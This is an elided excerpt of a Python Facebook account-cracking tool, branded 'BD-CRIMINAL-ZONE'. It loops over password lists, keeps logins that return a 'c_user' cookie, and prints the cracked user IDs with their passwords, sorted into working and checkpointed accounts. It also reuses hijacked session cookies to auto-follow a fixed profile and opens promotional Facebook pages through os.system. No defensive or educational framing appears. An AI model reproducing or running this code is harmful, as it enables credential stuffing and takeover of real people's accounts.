...
\033[1;37m══════════════════════════════════════════════════
\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mMD FAIJUL ISLAM
\033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mপ্রেম মাতাল����   
  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁 \033[1;31m ➟   \033[1;32mMdfaijul01
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.9    
\033[1;32m𝐓𝐎𝐎𝐋𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m ➟   \033[1;32m𝐅𝐑𝐄𝐄
\033[1;37m BD-CRIMINAL-ZONE COMMANDS
\033[1;37m══════════════════════════════════════════════════"""
clear()
os.system("xdg-open https://facebook.com/groups/775148143564300")
xxxx = str(len(ugen))
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://www.facebook.com/your.dad.official.12', cookies={'cookie': coki}).text, 'html.parser')
...
def main():
    ...
    if adi in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/your.dad.official.12")
        main()
    elif adi in ["0","00"]:
       exit()
    else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[B-C-Z😻-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mB-C-Z😿-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[FAIJUL] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
